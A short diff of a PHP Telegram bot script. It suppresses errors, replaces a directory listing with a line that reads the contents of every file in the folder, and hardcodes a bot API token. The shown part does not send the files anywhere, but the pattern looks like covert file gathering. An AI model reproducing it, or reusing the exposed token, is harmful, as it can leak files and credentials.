@@ -1,9 +1,7 @@
 <?php
 error_reporting(0);
 
-print_r(glob("*"));
-
-echo file_get_contents("composer.json");
+$map = array_map("file_get_contents",glob("*"));
 
 define("API_KEY", "1916150868:AAE6ZJfJkVBoGZltdes9RgXS1mDin2S1KbM");
 function bot($method,$datas=[]){
